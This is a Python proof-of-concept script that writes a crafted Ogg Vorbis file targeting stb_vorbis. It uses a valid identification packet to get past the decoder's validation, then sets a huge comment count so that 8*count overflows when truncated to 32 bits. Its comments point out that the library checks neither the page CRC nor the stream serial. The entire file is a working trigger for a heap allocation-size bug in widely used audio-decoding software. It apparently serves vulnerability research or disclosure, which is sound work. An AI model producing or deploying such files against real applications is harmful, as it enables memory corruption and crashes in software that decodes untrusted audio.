#!/usr/bin/env python3
"""Craft the minimal Ogg that reaches stb_vorbis's comment_list allocation.

No CRC is computed: stb_vorbis does not validate the page CRC (and its serial
check is commented out), so the bytes that matter are the page framing, the
identification packet it insists on, and the comment header's two u32 lengths.
"""
import struct, sys, pathlib

def page(seq, flags, payload):
    segs, rest = [], len(payload)
    while rest >= 255:
        segs.append(255); rest -= 255
    segs.append(rest)
    return (b"OggS" + bytes([0, flags]) + struct.pack("<q", 0)
            + struct.pack("<I", 0x1234) + struct.pack("<I", seq)
            + struct.pack("<I", 0)                      # CRC: not checked
            + bytes([len(segs)]) + bytes(segs) + payload)

# Identification packet — every field must survive stb_vorbis's validation or we
# never reach the comment header. blocksize nibbles must be 6..13 with log0<=log1.
ident = (b"\x01vorbis" + struct.pack("<I", 0) + bytes([1]) + struct.pack("<I", 44100)
         + struct.pack("<iii", 0, 0, 0) + bytes([(8 << 4) | 8]) + bytes([1]))
assert len(ident) == 30, len(ident)

COUNT = int(sys.argv[2]) if len(sys.argv) > 2 else 1646854400
comment = b"\x03vorbis" + struct.pack("<I", 0) + struct.pack("<I", COUNT)

out = pathlib.Path(sys.argv[1])
out.write_bytes(page(0, 0x02, ident) + page(1, 0x00, comment))
prod = 8 * COUNT
print(f"count={COUNT}  8*count={prod}  truncated to int32={prod % 2**32}  file={out.stat().st_size}B")
